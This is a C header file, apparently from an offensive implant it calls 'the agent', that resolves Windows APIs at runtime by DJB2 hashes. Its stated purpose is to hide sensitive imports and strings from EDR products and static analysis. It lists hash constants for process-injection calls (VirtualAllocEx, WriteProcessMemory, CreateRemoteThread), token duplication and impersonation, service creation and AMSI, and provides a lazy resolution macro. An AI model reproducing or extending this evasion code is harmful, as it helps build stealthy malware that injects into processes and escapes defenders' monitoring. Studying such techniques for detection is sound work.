/*
 * api_resolve.h — Dynamic API resolution via hashing.
 *
 * Instead of importing Win32 functions through the IAT (which EDRs monitor
 * and which static analysis tools flag), we resolve all sensitive APIs at
 * runtime using DJB2 hashes of their names.
 *
 * The agent's import table only shows benign functions. All sensitive calls
 * (VirtualAlloc, CreateThread, OpenProcess, etc.) are resolved dynamically.
 *
 * This also hides function names from string analysis — there are no
 * "VirtualAlloc" or "CreateRemoteThread" strings in the binary.
 */
#ifndef API_RESOLVE_H
#define API_RESOLVE_H

#include <windows.h>

/*
 * Resolve a function by DLL name hash + function name hash.
 * Returns the function address or NULL.
 *
 * Walks the PEB's InMemoryOrderModuleList to find loaded modules
 * (avoids calling GetModuleHandle which can be hooked).
 * Then walks the module's export table to find the function.
 */
void *api_resolve(DWORD moduleHash, DWORD functionHash);

/*
 * Resolve from a specific already-loaded module handle.
 * Walks the export table directly.
 */
void *api_resolve_from_module(HMODULE hMod, DWORD functionHash);

/*
 * DJB2 hash at compile time (for constants) and runtime.
 * The runtime version is in syscalls.c (djb2_hash).
 */
DWORD api_hash(const char *str);

/* ─── Module name hashes (DJB2 case-insensitive over "name.dll") ─── */
#define HASH_KERNEL32       0x7040EE75
#define HASH_NTDLL          0x22D3B5ED
#define HASH_ADVAPI32       0x67208A49
#define HASH_USER32         0x5A6BD3F3
#define HASH_WINHTTP        0x920E337D
#define HASH_BCRYPT         0x730076C3
#define HASH_WLDAP32        0xCB9A778C
#define HASH_SECUR32        0x347A54B6
#define HASH_NETAPI32       0x60C3DB35
#define HASH_IPHLPAPI       0x2234EBA6
#define HASH_AMSI           0xDAF90FD9
#define HASH_GDI32          0x2722E788
#define HASH_DNSAPI         0x3073894E
#define HASH_OLE32          0xF92C2394
#define HASH_OLEAUT32       0xE6AB711E

/* ─── Function hashes (DJB2 case-sensitive) ─── */
/* kernel32 */
#define HASH_LoadLibraryA           0x5FBFF0FB
#define HASH_LoadLibraryW           0x5FBFF111
#define HASH_GetProcAddress         0xCF31BB1F
#define HASH_VirtualAlloc           0x382C0F97
#define HASH_VirtualAllocEx         0xF36E5AB4
#define HASH_VirtualFree            0x668FCF2E
#define HASH_VirtualProtect         0x844FF18D
#define HASH_VirtualProtectEx       0xD812922A
#define HASH_CreateProcessW         0xAEB52E2F
#define HASH_CreateRemoteThread     0xAA30775D
#define HASH_OpenProcess            0x7136FDD6
#define HASH_WriteProcessMemory     0x6F22E8C8
#define HASH_ReadProcessMemory      0xB8932459
#define HASH_CreateFileW            0xEB96C610
#define HASH_WriteFile              0x663CECB0
#define HASH_ReadFile               0x71019921
#define HASH_CloseHandle            0x3870CA07
#define HASH_CreatePipe             0x9A8DEEE7
#define HASH_GetModuleHandleA       0x5A153F58
#define HASH_GetModuleHandleW       0x5A153F6E
#define HASH_GetSystemDirectoryW    0xE643C476
#define HASH_CreateFileMappingW     0xF33FFC9C
#define HASH_MapViewOfFile          0x11DEB0B3
#define HASH_UnmapViewOfFile        0xD639F256
#define HASH_HeapAlloc              0x1FFD670E
#define HASH_HeapFree               0x374893C5
#define HASH_HeapReAlloc            0x1E31C125
#define HASH_Sleep                  0x0E19E5FE
#define HASH_GetTickCount64         0x614DB023
#define HASH_QueryPerformanceCounter 0xDB4E150D

/* ntdll */
#define HASH_NtQuerySystemInformation 0xEE4F73A8

/* advapi32 */
#define HASH_OpenProcessToken       0xC57BD097
#define HASH_DuplicateTokenEx       0x7D9A8F1E
#define HASH_ImpersonateLoggedOnUser 0xA6FFD55A
#define HASH_RevertToSelf           0x58CF32AA
#define HASH_LookupAccountSidW      0xBC518D43
#define HASH_SetThreadToken         0x575B17CA
#define HASH_AdjustTokenPrivileges  0xCE4CD9CB
#define HASH_GetTokenInformation    0x8ED47F2C
#define HASH_LookupPrivilegeNameW   0xE6176FFE
#define HASH_RegOpenKeyExW          0x074A9772
#define HASH_RegQueryValueExW       0x6B95D12A
#define HASH_OpenSCManagerW         0xBAEF479F
#define HASH_CreateServiceW         0x931ECE21
#define HASH_StartServiceW          0x7EDAE33B

/*
 * Macro for lazy resolution: resolve once, cache in a static.
 * Thread-safe via InterlockedCompareExchangePointer.
 *
 * Usage:
 *   RESOLVE_API(kernel32, VirtualAlloc);
 *   // Now pfnVirtualAlloc is available as a typed function pointer
 */
#define RESOLVE_API(module, func) \
    static void *_cached_##func = NULL; \
    if (!_cached_##func) { \
        void *_resolved = api_resolve(HASH_##module, HASH_##func); \
        InterlockedCompareExchangePointer(&_cached_##func, _resolved, NULL); \
    }

#define GET_API(func) ((void *)_cached_##func)

#endif /* API_RESOLVE_H */
